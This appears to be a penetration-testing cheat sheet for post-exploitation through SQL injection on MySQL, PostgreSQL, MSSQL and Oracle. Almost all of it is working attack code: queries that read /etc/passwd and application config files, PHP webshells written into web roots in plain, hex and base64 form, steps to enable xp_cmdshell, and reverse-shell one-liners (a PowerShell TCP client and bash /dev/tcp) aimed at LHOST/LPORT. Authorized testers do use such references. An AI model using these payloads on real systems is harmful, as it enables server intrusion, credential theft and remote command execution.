# Post-Exploitation via SQL Injection

## Overview
Once SQLi is confirmed and authorized for deeper exploitation, these techniques
allow reading files, writing webshells, and executing OS commands through the database.

## File Read Techniques

### MySQL
```sql
-- LOAD_FILE (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/proc/self/environ');       -- Environment variables
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Check FILE privilege
SELECT file_priv FROM mysql.user WHERE user=CURRENT_USER();
```

### PostgreSQL
```sql
-- pg_read_file (superuser only, within data directory by default)
SELECT pg_read_file('/etc/passwd', 0, 10000);

-- COPY to temp table
CREATE TABLE tmp_read(content text);
COPY tmp_read FROM '/etc/passwd';
SELECT * FROM tmp_read;
DROP TABLE tmp_read;

-- Large objects
SELECT lo_import('/etc/passwd');
SELECT lo_get(OID);
```

### MSSQL
```sql
-- OPENROWSET BULK (sysadmin)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;

-- xp_cmdshell + type command
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';
```

### Oracle
```sql
-- UTL_FILE (requires directory object)
DECLARE f UTL_FILE.FILE_TYPE;
BEGIN f := UTL_FILE.FOPEN('DIRECTORY_NAME','target.txt','R'); END;

-- Java (if CREATE PROCEDURE available)
-- Multi-step: create Java source that reads files
```

## File Write / Webshell Techniques

### MySQL
```sql
-- INTO OUTFILE (requires FILE privilege + writable dir)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';

-- INTO DUMPFILE (binary-safe, single row)
SELECT 0x3C3F7068702073797374656D28245F4745545B2263225D293B203F3E INTO DUMPFILE '/var/www/html/cmd.php';

-- General log trick (alternative when OUTFILE fails)
SET global general_log = 'ON';
SET global general_log_file = '/var/www/html/cmd.php';
SELECT '<?php system($_GET["c"]); ?>';
SET global general_log = 'OFF';
```

### PostgreSQL
```sql
-- COPY TO (superuser)
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php';

-- Large objects write
SELECT lo_from_bytea(0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==','base64'));
SELECT lo_export(OID, '/var/www/html/cmd.php');
```

### MSSQL
```sql
-- Via xp_cmdshell echo
EXEC xp_cmdshell 'echo ^<?php system($_GET["c"]); ?^> > C:\inetpub\wwwroot\cmd.php';

-- Via sp_makewebtask (deprecated but may exist)
EXEC sp_makewebtask 'C:\inetpub\wwwroot\output.html','SELECT * FROM users';
```

## OS Command Execution

### MSSQL — xp_cmdshell
```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';

-- Reverse shell
EXEC xp_cmdshell 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(''LHOST'',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"';
```

### PostgreSQL — COPY TO PROGRAM
```sql
-- Requires superuser (PostgreSQL 9.3+)
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"';

-- Alternative: PL/Python
CREATE EXTENSION plpythonu;
CREATE FUNCTION cmd(c text) RETURNS text AS $$ import os; return os.popen(c).read() $$ LANGUAGE plpythonu;
SELECT cmd('id');
```

### MySQL — User Defined Functions
```sql
-- Requires write access to plugin directory
-- 1. Write UDF shared object
SELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 2. Create function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';

-- 3. Execute
SELECT sys_exec('id > /tmp/output.txt');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"');
```

## Privilege Checks Before Attempting
```sql
-- MySQL: Check if current user has FILE privilege
SELECT file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1);

-- MySQL: Check secure_file_priv (empty = unrestricted, NULL = disabled)
SELECT @@secure_file_priv;

-- MSSQL: Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- PostgreSQL: Check if superuser
SELECT current_setting('is_superuser');
```

## Common Pitfalls
- `secure_file_priv` in MySQL restricts LOAD_FILE/INTO OUTFILE to specific directory
- AppArmor/SELinux may block MySQL from reading/writing outside data dir
- MSSQL xp_cmdshell disabled by default since SQL Server 2005
- PostgreSQL COPY TO PROGRAM requires superuser and may be restricted
- Web root path varies — enumerate it first via error messages or known paths
